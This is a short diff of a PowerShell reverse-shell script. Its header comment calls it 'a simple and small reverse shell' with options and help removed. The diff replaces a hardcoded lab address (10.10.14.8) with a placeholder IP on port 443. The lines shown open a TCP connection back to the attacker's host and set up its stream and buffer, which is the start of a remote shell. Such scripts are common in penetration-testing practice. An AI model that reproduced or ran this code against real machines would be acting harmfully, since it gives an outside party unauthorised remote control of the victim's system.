@@ -1,7 +1,7 @@
 # A simple and small reverse shell. All options and help removed to save space.
 # Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
 
-$myClient = New-Object System.Net.Sockets.TCPClient('10.10.14.8',443);
+$myClient = New-Object System.Net.Sockets.TCPClient('10.10.XX.XX',443);
 $myStream = $myClient.GetStream();
 [byte[]]$myBuffer = 0..65535 | % { 0 };
 
